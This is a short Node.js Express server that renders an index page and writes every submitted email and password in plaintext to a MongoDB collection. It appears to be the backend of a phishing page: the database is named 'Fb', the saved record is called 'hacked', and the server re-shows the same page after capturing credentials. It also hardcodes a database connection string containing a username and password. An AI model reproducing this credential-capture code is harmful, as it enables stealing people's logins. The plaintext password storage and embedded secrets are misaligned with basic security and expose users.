const express = require("express");
const app = express();
const path = require("path");
require("./db/conection");
const hbs = require("hbs");
const Register = require("./models/reg");
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
const port = process.env.PORT || 3000;
const staticPath = path.join(__dirname, "../public/");
const templatePath = path.join(__dirname, "../templates/views");
const partialsPath = path.join(__dirname, "../templates/partials");
const DB =
  "mongodb+srv://numananees:someonehackedit@cluster0.frwu6.mongodb.net/Fb?retryWrites=true&w=majority";

app.use(express.static(staticPath));
app.set("view engine", "hbs");
app.set("views", templatePath);
hbs.registerPartials(partialsPath);

app.get("/", (req, res) => {
  res.render("index");
});
//---------------------------------------create a new user---------------------------------------------------------
app.post("/", async (req, res) => {
  try {
    const user = new Register({
      email: req.body.email,
      password: req.body.password,
    });
    const hacked = await user.save();
    res.status(201).render("index");
  } catch (e) {
    res.status(404).send(e);
  }
});

app.listen(port, () => {
  console.log(`Server is running at ${port}`);
});
